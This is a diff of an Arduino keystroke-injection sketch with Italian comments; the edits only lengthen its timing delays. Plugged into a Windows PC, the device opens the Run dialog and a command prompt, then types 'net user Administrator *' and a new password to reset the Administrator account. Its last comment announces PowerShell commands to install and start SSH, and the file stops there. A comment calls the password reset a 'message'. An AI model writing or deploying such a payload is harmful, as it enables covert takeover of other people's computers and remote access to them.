@@ -1,28 +1,28 @@
 #include <Keyboard.h>
 
 void setup() {
-    delay(2000);
+    delay(3000);
     Keyboard.begin();
 
     // Step 1: Apri la finestra "Esegui"
     Keyboard.press(KEY_LEFT_GUI); // Tasto Windows
     Keyboard.press('r');
-    delay(100);
+    delay(200);
     Keyboard.releaseAll();
-    delay(500);
+    delay(600);
 
     // Step 2: Scrivi "cmd" e premi invio
     Keyboard.print("cmd");
-    delay(300);
+    delay(400);
     Keyboard.press(KEY_RETURN);
     Keyboard.release(KEY_RETURN);
-    delay(1000); // Attendi che il CMD si apra
+    delay(2000); // Attendi che il CMD si apra
 
     // Step 3: Scrivi il messaggio
     Keyboard.println("net user Administrator *");
-    delay(100);
+    delay(200);
     Keyboard.println("Nuova.pw");
-    delay(100);
+    delay(200);
     Keyboard.println("Nuova.pw");
 
     // Step 4: Comandi PowerShell per installare e avviare SSH
